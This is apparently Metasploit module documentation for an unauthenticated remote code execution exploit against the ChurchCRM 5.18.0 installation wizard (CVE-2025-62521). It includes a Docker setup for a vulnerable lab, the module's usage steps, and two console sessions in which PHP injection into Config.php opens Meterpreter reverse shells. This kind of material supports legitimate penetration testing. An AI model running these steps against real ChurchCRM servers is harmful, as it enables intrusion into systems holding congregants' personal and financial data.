## Vulnerable Application

ChurchCRM is an open-source, PHP-based CRM designed to help churches manage members, groups, events, and finances.
### Description

This module exploits an unauthenticated Remote Code Execution (RCE) vulnerability in ChurchCRM versions 5.18.0 and earlier. The vulnerability, tracked as CVE-2025-62521, occurs during the initial installation process.

Due to insufficient sanitization of user input within the installation wizard, an attacker can inject arbitrary PHP code into the `Include/Config.php` file. Since this configuration file is included in nearly every page of the application, the injected code is executed upon every page load, providing both immediate execution and a form of persistence until the file is manually cleaned.

- Project Homepage: https://churchcrm.io/
- Source Code: https://github.com/ChurchCRM/CRM
- Vulnerability Reference: https://github.com/ChurchCRM/CRM/security/advisories/GHSA-m8jq-j3p9-2xf3
### Docker installation

To quickly set up a testing environment for this module, you can use the following Docker configuration. This setup mimics a fresh installation of **ChurchCRM 5.18.0** on an Ubuntu-based LAMP stack.

- Create a file named `Dockerfile` with the following content:

```Dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

ARG DB_NAME=churchcrm
ARG DB_USER=churchcrm
ARG DB_PASS=churchcrm_password

RUN apt-get update && apt-get install -y \
    apache2 mariadb-server mariadb-client php php-bcmath \
    php-cli php-curl php-dev php-gd php-intl php-mbstring \
    php-mysql php-soap php-xml php-zip unzip curl gawk \
    && apt-get clean

WORKDIR /tmp
RUN VERSION="5.18.0" \
    && curl -L -o churchcrm.zip https://github.com/ChurchCRM/CRM/releases/download/$VERSION/ChurchCRM-$VERSION.zip \
    && unzip churchcrm.zip \
    && mv churchcrm /var/www/html/ \
    && chown -R www-data:www-data /var/www/html/churchcrm \
    && rm churchcrm.zip

RUN printf "file_uploads = On\n\
allow_url_fopen = On\n\
short_open_tag = On\n\
memory_limit = 256M\n\
upload_max_filesize = 100M\n\
max_execution_time = 360" > /etc/php/8.1/apache2/conf.d/99-churchcrm.ini

RUN echo '<VirtualHost *:80>\n\
    DocumentRoot /var/www/html/churchcrm/\n\
    <Directory /var/www/html/churchcrm/>\n\
        Options -Indexes +FollowSymLinks\n\
        AllowOverride All\n\
        Require all granted\n\
    </Directory>\n\
    ErrorLog ${APACHE_LOG_DIR}/error.log\n\
    CustomLog ${APACHE_LOG_DIR}/access.log combined\n\
</VirtualHost>' > /etc/apache2/sites-available/churchcrm.conf

RUN a2enmod rewrite && a2dissite 000-default.conf && a2ensite churchcrm.conf

RUN echo '#!/bin/bash\n\
service mariadb start\n\
# Création de la DB si elle n existe pas\n\
mariadb -e "CREATE DATABASE IF NOT EXISTS ${DB_NAME} DEFAULT CHARACTER SET utf8;"\n\
mariadb -e "GRANT ALL ON ${DB_NAME}.* TO \"${DB_USER}\"@\"localhost\" IDENTIFIED BY \"${DB_PASS}\";"\n\
mariadb -e "FLUSH PRIVILEGES;"\n\
apachectl -D FOREGROUND' > /start.sh && chmod +x /start.sh

ENV DB_NAME=${DB_NAME}
ENV DB_USER=${DB_USER}
ENV DB_PASS=${DB_PASS}

EXPOSE 80

CMD ["/start.sh"]
```

- Create a file named `docker-compose.yml` in the same directory:

```yaml
services:
  churchcrm:
    build: 
      context: .
      args:
        - DB_NAME=churchcrm
        - DB_USER=churchcrm
        - DB_PASS=churchcrm_password
    container_name: churchcrm_app
    image: churchcrm-image:latest
    ports:
      - "80:80"
    volumes:
      - churchcrm_db_data:/var/lib/mysql
      - churchcrm_web_data:/var/www/html/churchcrm
    restart: unless-stopped

volumes:
  churchcrm_db_data:
  churchcrm_web_data:
```

Then, run the following command to start the vulnerable application : 

```bash
docker-compose up --build
```

Once started, the application will be available at `http://<your-ip>/`. **Do not complete the installation wizard**, as the module targets the setup process itself.

### Linux installation

If you prefer to set up ChurchCRM on a dedicated Linux host or an LXD container, you can use the official installation script present in the [source code](https://github.com/ChurchCRM/CRM/archive/refs/tags/5.18.0.zip).

> [!WARNING] By default, the installer fetches the latest version of ChurchCRM. To test this specific exploit, you **must** force the script to use version **5.18.0** or older.

```shell
VERSION=$(eval "$VERSION_CMD") #112
# Become
VERSION="5.18.0"
```

The application should also be available at `http://<your-ip>/`.

## Verification step

This module requires that the CRM is in its “Installation wizard” mode. When accessing to the website, it should automatically redirect you to the installation page. If this condition is not met, the module won't be able to send the PHP injection leading to code execution. In order to be in the "Installation wizard" mode, the `Include` directory should not contain the `Config.php` file. If it's the case, and you somehow have access to the file, you can delete it. It should put you back into the installation mode.

1. Start `msfconsole`
2. `use exploit/multi/http/churchcrm_install_unauth_rce`
3. Set the target `RHOSTS` and `RPORT` according to the target Host and the port which ChurchCRM's service is running.
4. Set your host and port for the reverse shell connection at `LHOST` and `LPORT`.
5. Set the `TARGETURI` which represent the base path that lead to the ChurchCRM page.
6. Set the target (0 for Linux, 1 for PHP).
7. Run the exploit with `run`.

## Scenarios

### Linux target : ChurchCRM 5.18.0 on Ubuntu 22.04 LTS (Docker Image)

```bash
msf > use exploit/multi/http/churchcrm_install_unauth_rce
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf exploit(multi/http/churchcrm_install_unauth_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf exploit(multi/http/churchcrm_install_unauth_rce) > set LHOST 172.18.0.1
LHOST => 172.18.0.1
msf exploit(multi/http/churchcrm_install_unauth_rce) > set LPORT 23456
LPORT => 23456
msf exploit(multi/http/churchcrm_install_unauth_rce) > set target 0
target => 0
msf exploit(multi/http/churchcrm_install_unauth_rce) > show options

Module options (exploit/multi/http/churchcrm_install_unauth_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:po
                                         rt[,type:host:port][...]. Supported
                                         proxies: http, sapni, socks4, socks5
                                         , socks5h
   RHOSTS     127.0.0.1        yes       The target host(s), see https://docs
                                         .metasploit.com/docs/using-metasploi
                                         t/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing conne
                                         ctions
   SSLCert                     no        Path to a custom SSL certificate (de
                                         fault is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (def
                                         ault is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to
                                        listen on. This must be an address on
                                        the local machine or 0.0.0.0 to liste
                                       n on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.18.0.1       yes       The listen address (an interface may be
                                     specified)
   LPORT  23456            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux/unix Command

   
View the full module info with the info, or info -d command.

msf exploit(multi/http/churchcrm_install_unauth_rce) > run
[*] Started reverse TCP handler on 172.18.0.1:23456
[*] Checking if the target is reachable...
[+] Target is reachable.
[*] Injecting backdoor into Include/Config.php via setup page...
[+] Backdoor injection attempt completed.
[*] Uploading payload to the target server...
[*] Command Stager progress -  68.40% done (500/731 bytes)
[*] Sending stage (1062760 bytes) to 172.18.0.2
[*] Meterpreter session 1 opened (172.18.0.1:23456 -> 172.18.0.2:35606) at 2026-02-04 15:55:50 +0100
[*] Command Stager progress - 100.00% done (731/731 bytes)
[+] Payload uploaded successfully.
[*] Cleaning up Include/Config.php to remove backdoor...
[+] Cleanup completed.

meterpreter > getpid
Current pid: 226
meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer     : 6661686d2310
OS           : Ubuntu 22.04 (Linux 6.18.7-arch1-1)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >
```

### PHP target : ChurchCRM 5.18.0 on Ubuntu 22.04 LTS (Docker Image)

```bash
msf > use exploit/multi/http/churchcrm_install_unauth_rce
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf exploit(multi/http/churchcrm_install_unauth_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf exploit(multi/http/churchcrm_install_unauth_rce) > set LHOST 172.18.0.1
LHOST => 172.18.0.1
msf exploit(multi/http/churchcrm_install_unauth_rce) > set LPORT 23456
LPORT => 23456
msf exploit(multi/http/churchcrm_install_unauth_rce) > set target 1
target => 1
msf exploit(multi/http/churchcrm_install_unauth_rce) > show options

Module options (exploit/multi/http/churchcrm_install_unauth_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:po
                                         rt[,type:host:port][...]. Supported
                                         proxies: http, sapni, socks4, socks5
                                         , socks5h
   RHOSTS     127.0.0.1        yes       The target host(s), see https://docs
                                         .metasploit.com/docs/using-metasploi
                                         t/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing conne
                                         ctions
   SSLCert                     no        Path to a custom SSL certificate (de
                                         fault is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (def
                                         ault is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to
                                        listen on. This must be an address on
                                        the local machine or 0.0.0.0 to liste
                                       n on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.18.0.1       yes       The listen address (an interface may be
                                     specified)
   LPORT  23456            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   PHP Meterpreter

   
View the full module info with the info, or info -d command.

msf exploit(multi/http/churchcrm_install_unauth_rce) > run
[*] Started reverse TCP handler on 172.18.0.1:23456
[*] Checking if the target is reachable...
[+] Target is reachable.
[*] Injecting backdoor into Include/Config.php via setup page...
[+] Backdoor injection attempt completed.
[*] Uploading PHP Meterpreter payload...
[*] Executing payload /tmp/qrjwXOaY.php...
[*] Sending stage (42137 bytes) to 172.18.0.2
[*] Meterpreter session 1 opened (172.18.0.1:23456 -> 172.18.0.2:35186) at 2026-02-04 16:00:31 +0100
[+] PHP Meterpreter payload executed successfully.
[*] Removing payload file: /tmp/qrjwXOaY.php
[*] Cleaning up Include/Config.php to remove backdoor...
[+] Cleanup completed.

meterpreter > getpid
Current pid: 233
meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer        : 6661686d2310
OS              : Linux 6661686d2310 6.18.7-arch1-1 #1 SMP PREEMPT_DYNAMIC Sat, 24 Jan 2026 00:47:39 +0000 x86_64
Architecture    : x64
System Language : C
Meterpreter     : php/linux
meterpreter >
```
